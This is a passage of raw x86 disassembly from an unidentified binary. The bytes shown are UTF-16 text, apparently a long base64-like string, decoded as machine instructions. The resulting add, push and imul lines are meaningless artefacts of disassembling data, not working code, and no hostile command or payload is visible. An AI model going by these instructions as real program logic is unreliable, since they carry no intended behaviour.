  40a157:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  40a15b:	00 52 00             	add    %dl,0x0(%edx)
  40a15e:	38 00                	cmp    %al,(%eax)
  40a160:	58                   	pop    %eax
  40a161:	00 66 00             	add    %ah,0x0(%esi)
  40a164:	37                   	aaa
  40a165:	00 37                	add    %dh,(%edi)
  40a167:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  40a16b:	00 5a 00             	add    %bl,0x0(%edx)
  40a16e:	6a 00                	push   $0x0
  40a170:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40a174:	56                   	push   %esi
  40a175:	00 6d 00             	add    %ch,0x0(%ebp)
  40a178:	4b                   	dec    %ebx
  40a179:	00 63 00             	add    %ah,0x0(%ebx)
  40a17c:	63 00                	arpl   %eax,(%eax)
  40a17e:	6d                   	insl   (%dx),%es:(%edi)
  40a17f:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40a183:	00 67 00             	add    %ah,0x0(%edi)
  40a186:	57                   	push   %edi
  40a187:	00 73 00             	add    %dh,0x0(%ebx)
  40a18a:	69 00 46 00 34 00    	imul   $0x340046,(%eax),%eax
  40a190:	48                   	dec    %eax
  40a191:	00 6e 00             	add    %ch,0x0(%esi)
  40a194:	44                   	inc    %esp
  40a195:	00 4e 00             	add    %cl,0x0(%esi)
  40a198:	53                   	push   %ebx
  40a199:	00 73 00             	add    %dh,0x0(%ebx)
  40a19c:	38 00                	cmp    %al,(%eax)
  40a19e:	74 00                	je     0x40a1a0
  40a1a0:	76 00                	jbe    0x40a1a2
  40a1a2:	48                   	dec    %eax
  40a1a3:	00 75 00             	add    %dh,0x0(%ebp)
  40a1a6:	6a 00                	push   $0x0
  40a1a8:	6d                   	insl   (%dx),%es:(%edi)
  40a1a9:	00 59 00             	add    %bl,0x0(%ecx)
  40a1ac:	61                   	popa
  40a1ad:	00 30                	add    %dh,(%eax)
  40a1af:	00 6a 00             	add    %ch,0x0(%edx)
  40a1b2:	4f                   	dec    %edi
  40a1b3:	00 39                	add    %bh,(%ecx)
  40a1b5:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40a1b9:	00 37                	add    %dh,(%edi)
  40a1bb:	00 59 00             	add    %bl,0x0(%ecx)
  40a1be:	48                   	dec    %eax
  40a1bf:	00 4e 00             	add    %cl,0x0(%esi)
  40a1c2:	6a 00                	push   $0x0
  40a1c4:	63 00                	arpl   %eax,(%eax)
  40a1c6:	6a 00                	push   $0x0
  40a1c8:	5a                   	pop    %edx
  40a1c9:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40a1cd:	00 32                	add    %dh,(%edx)
  40a1cf:	00 58 00             	add    %bl,0x0(%eax)
  40a1d2:	74 00                	je     0x40a1d4
  40a1d4:	6a 00                	push   $0x0
  40a1d6:	2f                   	das
  40a1d7:	00 6b 00             	add    %ch,0x0(%ebx)
  40a1da:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a1de:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a1e2:	34 00                	xor    $0x0,%al
  40a1e4:	68 00 51 00 6e       	push   $0x6e005100
  40a1e9:	00 45 00             	add    %al,0x0(%ebp)
  40a1ec:	77 00                	ja     0x40a1ee
  40a1ee:	59                   	pop    %ecx
  40a1ef:	00 39                	add    %bh,(%ecx)
  40a1f1:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40a1f5:	00 4e 00             	add    %cl,0x0(%esi)
  40a1f8:	71 00                	jno    0x40a1fa
  40a1fa:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40a1fe:	43                   	inc    %ebx
  40a1ff:	00 56 00             	add    %dl,0x0(%esi)
  40a202:	74 00                	je     0x40a204
  40a204:	46                   	inc    %esi
  40a205:	00 4f 00             	add    %cl,0x0(%edi)
  40a208:	75 00                	jne    0x40a20a
  40a20a:	69 00 76 00 58 00    	imul   $0x580076,(%eax),%eax
  40a210:	38 00                	cmp    %al,(%eax)
  40a212:	4d                   	dec    %ebp
  40a213:	00 33                	add    %dh,(%ebx)
  40a215:	00 6a 00             	add    %ch,0x0(%edx)
  40a218:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a21c:	2b 00                	sub    (%eax),%eax
  40a21e:	78 00                	js     0x40a220
  40a220:	78 00                	js     0x40a222
  40a222:	4b                   	dec    %ebx
  40a223:	00 71 00             	add    %dh,0x0(%ecx)
  40a226:	59                   	pop    %ecx
  40a227:	00 65 00             	add    %ah,0x0(%ebp)
  40a22a:	48                   	dec    %eax
  40a22b:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40a22f:	00 36                	add    %dh,(%esi)
  40a231:	00 6e 00             	add    %ch,0x0(%esi)
  40a234:	55                   	push   %ebp
  40a235:	00 63 00             	add    %ah,0x0(%ebx)
  40a238:	78 00                	js     0x40a23a
  40a23a:	62 00                	bound  %eax,(%eax)
  40a23c:	4e                   	dec    %esi
  40a23d:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40a241:	00 65 00             	add    %ah,0x0(%ebp)
  40a244:	53                   	push   %ebx
  40a245:	00 32                	add    %dh,(%edx)
  40a247:	00 71 00             	add    %dh,0x0(%ecx)
  40a24a:	46                   	inc    %esi
  40a24b:	00 38                	add    %bh,(%eax)
  40a24d:	00 6f 00             	add    %ch,0x0(%edi)
  40a250:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  40a254:	78 00                	js     0x40a256
  40a256:	71 00                	jno    0x40a258
  40a258:	34 00                	xor    $0x0,%al
  40a25a:	39 00                	cmp    %eax,(%eax)
  40a25c:	4a                   	dec    %edx
  40a25d:	00 57 00             	add    %dl,0x0(%edi)
  40a260:	69 00 56 00 6e 00    	imul   $0x6e0056,(%eax),%eax
  40a266:	30 00                	xor    %al,(%eax)
  40a268:	76 00                	jbe    0x40a26a
  40a26a:	57                   	push   %edi
  40a26b:	00 50 00             	add    %dl,0x0(%eax)
  40a26e:	48                   	dec    %eax
  40a26f:	00 55 00             	add    %dl,0x0(%ebp)
  40a272:	55                   	push   %ebp
  40a273:	00 78 00             	add    %bh,0x0(%eax)
  40a276:	4b                   	dec    %ebx
  40a277:	00 39                	add    %bh,(%ecx)
  40a279:	00 38                	add    %bh,(%eax)
  40a27b:	00 48 00             	add    %cl,0x0(%eax)
  40a27e:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40a282:	47                   	inc    %edi
  40a283:	00 6e 00             	add    %ch,0x0(%esi)
  40a286:	57                   	push   %edi
  40a287:	00 2b                	add    %ch,(%ebx)
  40a289:	00 6a 00             	add    %ch,0x0(%edx)
  40a28c:	77 00                	ja     0x40a28e
  40a28e:	32 00                	xor    (%eax),%al
  40a290:	68 00 5a 00 76       	push   $0x76005a00
  40a295:	00 36                	add    %dh,(%esi)
  40a297:	00 63 00             	add    %ah,0x0(%ebx)
  40a29a:	32 00                	xor    (%eax),%al
  40a29c:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40a2a0:	63 00                	arpl   %eax,(%eax)
  40a2a2:	59                   	pop    %ecx
  40a2a3:	00 47 00             	add    %al,0x0(%edi)
  40a2a6:	73 00                	jae    0x40a2a8
  40a2a8:	63 00                	arpl   %eax,(%eax)
  40a2aa:	39 00                	cmp    %eax,(%eax)
  40a2ac:	5a                   	pop    %edx
  40a2ad:	00 42 00             	add    %al,0x0(%edx)
  40a2b0:	45                   	inc    %ebp
  40a2b1:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40a2b5:	00 4f 00             	add    %cl,0x0(%edi)
  40a2b8:	58                   	pop    %eax
  40a2b9:	00 61 00             	add    %ah,0x0(%ecx)
  40a2bc:	48                   	dec    %eax
  40a2bd:	00 48 00             	add    %cl,0x0(%eax)
  40a2c0:	50                   	push   %eax
  40a2c1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2c4:	30 00                	xor    %al,(%eax)
  40a2c6:	48                   	dec    %eax
  40a2c7:	00 59 00             	add    %bl,0x0(%ecx)
  40a2ca:	67 00 6c 00          	add    %ch,0x0(%si)
  40a2ce:	31 00                	xor    %eax,(%eax)
  40a2d0:	41                   	inc    %ecx
  40a2d1:	00 2b                	add    %ch,(%ebx)
  40a2d3:	00 66 00             	add    %ah,0x0(%esi)
  40a2d6:	33 00                	xor    (%eax),%eax
  40a2d8:	4e                   	dec    %esi
  40a2d9:	00 61 00             	add    %ah,0x0(%ecx)
  40a2dc:	72 00                	jb     0x40a2de
  40a2de:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40a2e2:	7a 00                	jp     0x40a2e4
  40a2e4:	41                   	inc    %ecx
  40a2e5:	00 5a 00             	add    %bl,0x0(%edx)
  40a2e8:	4e                   	dec    %esi
  40a2e9:	00 62 00             	add    %ah,0x0(%edx)
  40a2ec:	47                   	inc    %edi
  40a2ed:	00 6a 00             	add    %ch,0x0(%edx)
  40a2f0:	68 00 4e 00 4f       	push   $0x4f004e00
  40a2f5:	00 41 00             	add    %al,0x0(%ecx)
  40a2f8:	58                   	pop    %eax
  40a2f9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2fc:	58                   	pop    %eax
  40a2fd:	00 42 00             	add    %al,0x0(%edx)
  40a300:	53                   	push   %ebx
  40a301:	00 59 00             	add    %bl,0x0(%ecx)
  40a304:	4f                   	dec    %edi
  40a305:	00 78 00             	add    %bh,0x0(%eax)
  40a308:	61                   	popa
  40a309:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40a30d:	00 77 00             	add    %dh,0x0(%edi)
  40a310:	4f                   	dec    %edi
  40a311:	00 6e 00             	add    %ch,0x0(%esi)
  40a314:	57                   	push   %edi
  40a315:	00 5a 00             	add    %bl,0x0(%edx)
  40a318:	51                   	push   %ecx
  40a319:	00 5a 00             	add    %bl,0x0(%edx)
  40a31c:	58                   	pop    %eax
  40a31d:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40a321:	00 73 00             	add    %dh,0x0(%ebx)
  40a324:	72 00                	jb     0x40a326
  40a326:	79 00                	jns    0x40a328
  40a328:	73 00                	jae    0x40a32a
  40a32a:	50                   	push   %eax
  40a32b:	00 78 00             	add    %bh,0x0(%eax)
  40a32e:	4a                   	dec    %edx
  40a32f:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  40a333:	00 71 00             	add    %dh,0x0(%ecx)
  40a336:	59                   	pop    %ecx
  40a337:	00 38                	add    %bh,(%eax)
  40a339:	00 58 00             	add    %bl,0x0(%eax)
  40a33c:	6d                   	insl   (%dx),%es:(%edi)
  40a33d:	00 55 00             	add    %dl,0x0(%ebp)
  40a340:	6e                   	outsb  %ds:(%esi),(%dx)
  40a341:	00 6d 00             	add    %ch,0x0(%ebp)
  40a344:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a348:	42                   	inc    %edx
  40a349:	00 6e 00             	add    %ch,0x0(%esi)
  40a34c:	79 00                	jns    0x40a34e
  40a34e:	58                   	pop    %eax
  40a34f:	00 6a 00             	add    %ch,0x0(%edx)
  40a352:	64 00 31             	add    %dh,%fs:(%ecx)
  40a355:	00 33                	add    %dh,(%ebx)
  40a357:	00 57 00             	add    %dl,0x0(%edi)
  40a35a:	6c                   	insb   (%dx),%es:(%edi)
  40a35b:	00 78 00             	add    %bh,0x0(%eax)
  40a35e:	36 00 39             	add    %bh,%ss:(%ecx)
  40a361:	00 2b                	add    %ch,(%ebx)
  40a363:	00 51 00             	add    %dl,0x0(%ecx)
  40a366:	61                   	popa
  40a367:	00 38                	add    %bh,(%eax)
  40a369:	00 73 00             	add    %dh,0x0(%ebx)
  40a36c:	5a                   	pop    %edx
  40a36d:	00 63 00             	add    %ah,0x0(%ebx)
  40a370:	30 00                	xor    %al,(%eax)
  40a372:	6f                   	outsl  %ds:(%esi),(%dx)
  40a373:	00 6e 00             	add    %ch,0x0(%esi)
  40a376:	30 00                	xor    %al,(%eax)
  40a378:	45                   	inc    %ebp
  40a379:	00 41 00             	add    %al,0x0(%ecx)
  40a37c:	71 00                	jno    0x40a37e
  40a37e:	44                   	inc    %esp
  40a37f:	00 51 00             	add    %dl,0x0(%ecx)
  40a382:	4f                   	dec    %edi
  40a383:	00 66 00             	add    %ah,0x0(%esi)
  40a386:	4b                   	dec    %ebx
  40a387:	00 68 00             	add    %ch,0x0(%eax)
  40a38a:	76 00                	jbe    0x40a38c
  40a38c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a38d:	00 70 00             	add    %dh,0x0(%eax)
  40a390:	30 00                	xor    %al,(%eax)
  40a392:	72 00                	jb     0x40a394
  40a394:	73 00                	jae    0x40a396
  40a396:	55                   	push   %ebp
  40a397:	00 4e 00             	add    %cl,0x0(%esi)
  40a39a:	49                   	dec    %ecx
  40a39b:	00 78 00             	add    %bh,0x0(%eax)
  40a39e:	50                   	push   %eax
  40a39f:	00 66 00             	add    %ah,0x0(%esi)
  40a3a2:	35 00 4c 00 4e       	xor    $0x4e004c00,%eax
  40a3a7:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a3ab:	00 63 00             	add    %ah,0x0(%ebx)
  40a3ae:	79 00                	jns    0x40a3b0
  40a3b0:	74 00                	je     0x40a3b2
  40a3b2:	55                   	push   %ebp
  40a3b3:	00 4e 00             	add    %cl,0x0(%esi)
  40a3b6:	53                   	push   %ebx
  40a3b7:	00 2b                	add    %ch,(%ebx)
  40a3b9:	00 76 00             	add    %dh,0x0(%esi)
  40a3bc:	4f                   	dec    %edi
  40a3bd:	00 39                	add    %bh,(%ecx)
  40a3bf:	00 47 00             	add    %al,0x0(%edi)
  40a3c2:	32 00                	xor    (%eax),%al
  40a3c4:	32 00                	xor    (%eax),%al
  40a3c6:	44                   	inc    %esp
  40a3c7:	00 67 00             	add    %ah,0x0(%edi)
  40a3ca:	52                   	push   %edx
  40a3cb:	00 41 00             	add    %al,0x0(%ecx)
  40a3ce:	58                   	pop    %eax
  40a3cf:	00 68 00             	add    %ch,0x0(%eax)
  40a3d2:	67 00 4c 00          	add    %cl,0x0(%si)
  40a3d6:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40a3d9:	00 6a 00             	add    %ch,0x0(%edx)
  40a3dc:	32 00                	xor    (%eax),%al
  40a3de:	58                   	pop    %eax
  40a3df:	00 6a 00             	add    %ch,0x0(%edx)
  40a3e2:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40a3e6:	33 00                	xor    (%eax),%eax
  40a3e8:	54                   	push   %esp
  40a3e9:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40a3ed:	00 58 00             	add    %bl,0x0(%eax)
  40a3f0:	32 00                	xor    (%eax),%al
  40a3f2:	38 00                	cmp    %al,(%eax)
  40a3f4:	53                   	push   %ebx
  40a3f5:	00 6f 00             	add    %ch,0x0(%edi)
  40a3f8:	42                   	inc    %edx
  40a3f9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3fc:	4f                   	dec    %edi
  40a3fd:	00 2f                	add    %ch,(%edi)
  40a3ff:	00 63 00             	add    %ah,0x0(%ebx)
  40a402:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40a406:	56                   	push   %esi
  40a407:	00 32                	add    %dh,(%edx)
  40a409:	00 65 00             	add    %ah,0x0(%ebp)
  40a40c:	72 00                	jb     0x40a40e
  40a40e:	46                   	inc    %esi
  40a40f:	00 51 00             	add    %dl,0x0(%ecx)
  40a412:	41                   	inc    %ecx
  40a413:	00 5a 00             	add    %bl,0x0(%edx)
  40a416:	2f                   	das
  40a417:	00 53 00             	add    %dl,0x0(%ebx)
  40a41a:	6b 00 49             	imul   $0x49,(%eax),%eax
  40a41d:	00 42 00             	add    %al,0x0(%edx)
  40a420:	54                   	push   %esp
  40a421:	00 77 00             	add    %dh,0x0(%edi)
  40a424:	6a 00                	push   $0x0
  40a426:	63 00                	arpl   %eax,(%eax)
  40a428:	6a 00                	push   $0x0
  40a42a:	33 00                	xor    (%eax),%eax
  40a42c:	72 00                	jb     0x40a42e
  40a42e:	72 00                	jb     0x40a430
  40a430:	46                   	inc    %esi
  40a431:	00 66 00             	add    %ah,0x0(%esi)
  40a434:	62 00                	bound  %eax,(%eax)
  40a436:	4f                   	dec    %edi
  40a437:	00 56 00             	add    %dl,0x0(%esi)
  40a43a:	43                   	inc    %ebx
  40a43b:	00 67 00             	add    %ah,0x0(%edi)
  40a43e:	4b                   	dec    %ebx
  40a43f:	00 73 00             	add    %dh,0x0(%ebx)
  40a442:	68 00 53 00 32       	push   $0x32005300
  40a447:	00 51 00             	add    %dl,0x0(%ecx)
  40a44a:	4e                   	dec    %esi
  40a44b:	00 78 00             	add    %bh,0x0(%eax)
  40a44e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a44f:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40a453:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a456:	54                   	push   %esp
  40a457:	00 47 00             	add    %al,0x0(%edi)
  40a45a:	79 00                	jns    0x40a45c
  40a45c:	76 00                	jbe    0x40a45e
  40a45e:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40a462:	54                   	push   %esp
  40a463:	00 66 00             	add    %ah,0x0(%esi)
  40a466:	42                   	inc    %edx
  40a467:	00 77 00             	add    %dh,0x0(%edi)
  40a46a:	35 00 76 00 6a       	xor    $0x6a007600,%eax
  40a46f:	00 35 00 4f 00 78    	add    %dh,0x78004f00
  40a475:	00 38                	add    %bh,(%eax)
  40a477:	00 2f                	add    %ch,(%edi)
  40a479:	00 51 00             	add    %dl,0x0(%ecx)
  40a47c:	78 00                	js     0x40a47e
  40a47e:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40a482:	72 00                	jb     0x40a484
  40a484:	50                   	push   %eax
  40a485:	00 36                	add    %dh,(%esi)
  40a487:	00 6b 00             	add    %ch,0x0(%ebx)
  40a48a:	75 00                	jne    0x40a48c
  40a48c:	6d                   	insl   (%dx),%es:(%edi)
  40a48d:	00 2b                	add    %ch,(%ebx)
  40a48f:	00 6f 00             	add    %ch,0x0(%edi)
  40a492:	35 00 58 00 6b       	xor    $0x6b005800,%eax
  40a497:	00 48 00             	add    %cl,0x0(%eax)
  40a49a:	35 00 5a 00 6c       	xor    $0x6c005a00,%eax
  40a49f:	00 49 00             	add    %cl,0x0(%ecx)
  40a4a2:	2f                   	das
  40a4a3:	00 6f 00             	add    %ch,0x0(%edi)
  40a4a6:	62 00                	bound  %eax,(%eax)
  40a4a8:	54                   	push   %esp
  40a4a9:	00 35 00 51 00 6d    	add    %dh,0x6d005100
  40a4af:	00 4a 00             	add    %cl,0x0(%edx)
  40a4b2:	32 00                	xor    (%eax),%al
  40a4b4:	72 00                	jb     0x40a4b6
  40a4b6:	73 00                	jae    0x40a4b8
  40a4b8:	50                   	push   %eax
  40a4b9:	00 31                	add    %dh,(%ecx)
  40a4bb:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a4bf:	00 69 00             	add    %ch,0x0(%ecx)
  40a4c2:	2b 00                	sub    (%eax),%eax
  40a4c4:	48                   	dec    %eax
  40a4c5:	00 35 00 46 00 5a    	add    %dh,0x5a004600
  40a4cb:	00 38                	add    %bh,(%eax)
  40a4cd:	00 63 00             	add    %ah,0x0(%ebx)
  40a4d0:	58                   	pop    %eax
  40a4d1:	00 53 00             	add    %dl,0x0(%ebx)
  40a4d4:	4a                   	dec    %edx
  40a4d5:	00 41 00             	add    %al,0x0(%ecx)
  40a4d8:	39 00                	cmp    %eax,(%eax)
  40a4da:	57                   	push   %edi
  40a4db:	00 35 00 77 00 73    	add    %dh,0x73007700
  40a4e1:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40a4e5:	00 5a 00             	add    %bl,0x0(%edx)
  40a4e8:	44                   	inc    %esp
  40a4e9:	00 53 00             	add    %dl,0x0(%ebx)
  40a4ec:	78 00                	js     0x40a4ee
  40a4ee:	4f                   	dec    %edi
  40a4ef:	00 6e 00             	add    %ch,0x0(%esi)
  40a4f2:	63 00                	arpl   %eax,(%eax)
  40a4f4:	2b 00                	sub    (%eax),%eax
  40a4f6:	6d                   	insl   (%dx),%es:(%edi)
  40a4f7:	00 42 00             	add    %al,0x0(%edx)
  40a4fa:	7a 00                	jp     0x40a4fc
  40a4fc:	61                   	popa
  40a4fd:	00 57 00             	add    %dl,0x0(%edi)
  40a500:	7a 00                	jp     0x40a502
  40a502:	35 00 43 00 4d       	xor    $0x4d004300,%eax
  40a507:	00 30                	add    %dh,(%eax)
  40a509:	00 30                	add    %dh,(%eax)
  40a50b:	00 30                	add    %dh,(%eax)
  40a50d:	00 52 00             	add    %dl,0x0(%edx)
  40a510:	42                   	inc    %edx
  40a511:	00 78 00             	add    %bh,0x0(%eax)
  40a514:	34 00                	xor    $0x0,%al
  40a516:	69 00 56 00 61 00    	imul   $0x610056,(%eax),%eax
  40a51c:	68 00 44 00 6f       	push   $0x6f004400
  40a521:	00 78 00             	add    %bh,0x0(%eax)
  40a524:	46                   	inc    %esi
  40a525:	00 39                	add    %bh,(%ecx)
  40a527:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a52a:	39 00                	cmp    %eax,(%eax)
  40a52c:	37                   	aaa
  40a52d:	00 41 00             	add    %al,0x0(%ecx)
  40a530:	70 00                	jo     0x40a532
  40a532:	77 00                	ja     0x40a534
  40a534:	4e                   	dec    %esi
  40a535:	00 2b                	add    %ch,(%ebx)
  40a537:	00 45 00             	add    %al,0x0(%ebp)
  40a53a:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a53e:	46                   	inc    %esi
  40a53f:	00 30                	add    %dh,(%eax)
  40a541:	00 47 00             	add    %al,0x0(%edi)
  40a544:	62 00                	bound  %eax,(%eax)
  40a546:	79 00                	jns    0x40a548
  40a548:	72 00                	jb     0x40a54a
  40a54a:	72 00                	jb     0x40a54c
  40a54c:	50                   	push   %eax
  40a54d:	00 48 00             	add    %cl,0x0(%eax)
  40a550:	78 00                	js     0x40a552
  40a552:	44                   	inc    %esp
  40a553:	00 32                	add    %dh,(%edx)
  40a555:	00 47 00             	add    %al,0x0(%edi)
  40a558:	74 00                	je     0x40a55a
  40a55a:	45                   	inc    %ebp
  40a55b:	00 41 00             	add    %al,0x0(%ecx)
  40a55e:	55                   	push   %ebp
  40a55f:	00 6a 00             	add    %ch,0x0(%edx)
  40a562:	6e                   	outsb  %ds:(%esi),(%dx)
  40a563:	00 59 00             	add    %bl,0x0(%ecx)
  40a566:	45                   	inc    %ebp
  40a567:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40a56b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a56f:	00 38                	add    %bh,(%eax)
  40a571:	00 41 00             	add    %al,0x0(%ecx)
  40a574:	2b 00                	sub    (%eax),%eax
  40a576:	61                   	popa
  40a577:	00 4b 00             	add    %cl,0x0(%ebx)
  40a57a:	35 00 5a 00 70       	xor    $0x70005a00,%eax
  40a57f:	00 41 00             	add    %al,0x0(%ecx)
  40a582:	2f                   	das
  40a583:	00 71 00             	add    %dh,0x0(%ecx)
  40a586:	44                   	inc    %esp
  40a587:	00 57 00             	add    %dl,0x0(%edi)
  40a58a:	32 00                	xor    (%eax),%al
  40a58c:	59                   	pop    %ecx
  40a58d:	00 39                	add    %bh,(%ecx)
  40a58f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a592:	6f                   	outsl  %ds:(%esi),(%dx)
  40a593:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  40a597:	00 2f                	add    %ch,(%edi)
  40a599:	00 77 00             	add    %dh,0x0(%edi)
  40a59c:	4a                   	dec    %edx
  40a59d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5a0:	47                   	inc    %edi
  40a5a1:	00 4f 00             	add    %cl,0x0(%edi)
  40a5a4:	77 00                	ja     0x40a5a6
  40a5a6:	6b 00 41             	imul   $0x41,(%eax),%eax
  40a5a9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a5ac:	6c                   	insb   (%dx),%es:(%edi)
  40a5ad:	00 69 00             	add    %ch,0x0(%ecx)
  40a5b0:	74 00                	je     0x40a5b2
  40a5b2:	2f                   	das
  40a5b3:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40a5b7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5ba:	71 00                	jno    0x40a5bc
  40a5bc:	73 00                	jae    0x40a5be
  40a5be:	54                   	push   %esp
  40a5bf:	00 2b                	add    %ch,(%ebx)
  40a5c1:	00 30                	add    %dh,(%eax)
  40a5c3:	00 35 00 37 00 36    	add    %dh,0x36003700
  40a5c9:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40a5cd:	00 38                	add    %bh,(%eax)
  40a5cf:	00 75 00             	add    %dh,0x0(%ebp)
  40a5d2:	35 00 6d 00 4b       	xor    $0x4b006d00,%eax
  40a5d7:	00 52 00             	add    %dl,0x0(%edx)
  40a5da:	76 00                	jbe    0x40a5dc
  40a5dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5dd:	00 50 00             	add    %dl,0x0(%eax)
  40a5e0:	55                   	push   %ebp
  40a5e1:	00 65 00             	add    %ah,0x0(%ebp)
  40a5e4:	43                   	inc    %ebx
  40a5e5:	00 72 00             	add    %dh,0x0(%edx)
  40a5e8:	43                   	inc    %ebx
  40a5e9:	00 51 00             	add    %dl,0x0(%ecx)
  40a5ec:	4f                   	dec    %edi
  40a5ed:	00 63 00             	add    %ah,0x0(%ebx)
  40a5f0:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40a5f4:	78 00                	js     0x40a5f6
  40a5f6:	38 00                	cmp    %al,(%eax)
  40a5f8:	44                   	inc    %esp
  40a5f9:	00 79 00             	add    %bh,0x0(%ecx)
  40a5fc:	69 00 41 00 73 00    	imul   $0x730041,(%eax),%eax
  40a602:	62 00                	bound  %eax,(%eax)
  40a604:	49                   	dec    %ecx
  40a605:	00 59 00             	add    %bl,0x0(%ecx)
  40a608:	6e                   	outsb  %ds:(%esi),(%dx)
  40a609:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40a60d:	00 72 00             	add    %dh,0x0(%edx)
  40a610:	6f                   	outsl  %ds:(%esi),(%dx)
  40a611:	00 2f                	add    %ch,(%edi)
  40a613:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40a617:	00 76 00             	add    %dh,0x0(%esi)
  40a61a:	37                   	aaa
  40a61b:	00 59 00             	add    %bl,0x0(%ecx)
  40a61e:	2b 00                	sub    (%eax),%eax
  40a620:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40a624:	39 00                	cmp    %eax,(%eax)
  40a626:	56                   	push   %esi
  40a627:	00 67 00             	add    %ah,0x0(%edi)
  40a62a:	4b                   	dec    %ebx
  40a62b:	00 2f                	add    %ch,(%edi)
  40a62d:	00 35 00 4c 00 56    	add    %dh,0x56004c00
  40a633:	00 57 00             	add    %dl,0x0(%edi)
  40a636:	50                   	push   %eax
  40a637:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40a63b:	00 46 00             	add    %al,0x0(%esi)
  40a63e:	78 00                	js     0x40a640
  40a640:	59                   	pop    %ecx
  40a641:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a645:	00 71 00             	add    %dh,0x0(%ecx)
  40a648:	76 00                	jbe    0x40a64a
  40a64a:	48                   	dec    %eax
  40a64b:	00 51 00             	add    %dl,0x0(%ecx)
  40a64e:	56                   	push   %esi
  40a64f:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40a653:	00 63 00             	add    %ah,0x0(%ebx)
  40a656:	53                   	push   %ebx
  40a657:	00 38                	add    %bh,(%eax)
  40a659:	00 32                	add    %dh,(%edx)
  40a65b:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40a65f:	00 72 00             	add    %dh,0x0(%edx)
  40a662:	59                   	pop    %ecx
  40a663:	00 78 00             	add    %bh,0x0(%eax)
  40a666:	66 00 2b             	data16 add %ch,(%ebx)
  40a669:	00 56 00             	add    %dl,0x0(%esi)
  40a66c:	4d                   	dec    %ebp
  40a66d:	00 4f 00             	add    %cl,0x0(%edi)
  40a670:	70 00                	jo     0x40a672
  40a672:	78 00                	js     0x40a674
  40a674:	76 00                	jbe    0x40a676
  40a676:	55                   	push   %ebp
  40a677:	00 2b                	add    %ch,(%ebx)
  40a679:	00 48 00             	add    %cl,0x0(%eax)
  40a67c:	6d                   	insl   (%dx),%es:(%edi)
  40a67d:	00 6e 00             	add    %ch,0x0(%esi)
  40a680:	43                   	inc    %ebx
  40a681:	00 5a 00             	add    %bl,0x0(%edx)
  40a684:	62 00                	bound  %eax,(%eax)
  40a686:	4a                   	dec    %edx
  40a687:	00 4e 00             	add    %cl,0x0(%esi)
  40a68a:	76 00                	jbe    0x40a68c
  40a68c:	34 00                	xor    $0x0,%al
  40a68e:	61                   	popa
  40a68f:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40a693:	00 32                	add    %dh,(%edx)
  40a695:	00 59 00             	add    %bl,0x0(%ecx)
  40a698:	76 00                	jbe    0x40a69a
  40a69a:	33 00                	xor    (%eax),%eax
  40a69c:	49                   	dec    %ecx
  40a69d:	00 52 00             	add    %dl,0x0(%edx)
  40a6a0:	33 00                	xor    (%eax),%eax
  40a6a2:	4c                   	dec    %esp
  40a6a3:	00 59 00             	add    %bl,0x0(%ecx)
  40a6a6:	30 00                	xor    %al,(%eax)
  40a6a8:	52                   	push   %edx
  40a6a9:	00 69 00             	add    %ch,0x0(%ecx)
  40a6ac:	45                   	inc    %ebp
